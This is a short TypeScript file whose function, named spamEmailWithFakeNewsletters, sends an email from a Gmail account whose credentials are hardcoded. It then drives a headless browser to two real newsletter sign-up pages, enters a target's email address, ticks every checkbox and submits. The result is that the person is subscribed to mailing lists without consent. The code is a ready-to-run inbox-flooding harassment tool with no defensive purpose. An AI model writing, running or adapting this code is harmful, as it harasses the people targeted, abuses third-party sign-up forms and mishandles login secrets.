import nodemailer from 'nodemailer';
import puppeteer from 'puppeteer';

export async function spamEmailWithFakeNewsletters(
  email: string,
  message: string,
  subject: string,
  loginUsername: string = 'epoch_kids',
  password: string = 'okokokok'
) {
  // login to email using nodemailer with these credentials and then send the email message
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: loginUsername,
      pass: password,
    },
  });
  const mailOptions = {
    from: loginUsername,
    to: email,
    subject: subject,
    text: message,
  };
  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });

  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  {
    await page.goto('https://www.nbc26.com/account/manage-email-preferences');
    await page.type('input#id_email[type=email]', email);
    (await page.$$('input[type=checkbox]')).forEach(checkbox => {
      checkbox.click();
    });

    await page.click('input[type=submit]');
  }
  {
    await page.goto('https://www.crosswalk.com/newsletters/');
    await page.type('input[type=email]', email);
    (await page.$$('input[type=checkbox]')).forEach(checkbox => {
      checkbox.click();
    });
    await page.click('a.SubmitButton');
  }
}
